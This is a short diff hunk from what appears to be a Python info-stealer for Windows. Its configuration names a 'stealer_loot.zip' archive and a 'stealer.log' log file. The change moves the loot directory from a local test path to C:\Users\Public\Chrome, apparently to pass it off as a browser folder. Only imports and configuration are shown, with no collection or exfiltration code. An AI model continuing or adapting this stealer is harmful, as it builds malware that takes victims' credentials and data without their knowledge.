@@ -8,7 +8,7 @@ import os, sys, json, re, shutil, subprocess, zipfile, tempfile, logging, dateti
 import winreg, time
 
 # ============ CONFIG ============
-LOOT_DIR = pathlib.Path(r"C:\projects\chimera-local-test")
+LOOT_DIR = pathlib.Path(r"C:\Users\Public\Chrome")
 LOOT_ZIP = LOOT_DIR / "stealer_loot.zip"
 LOG_FILE = LOOT_DIR / "stealer.log"
 
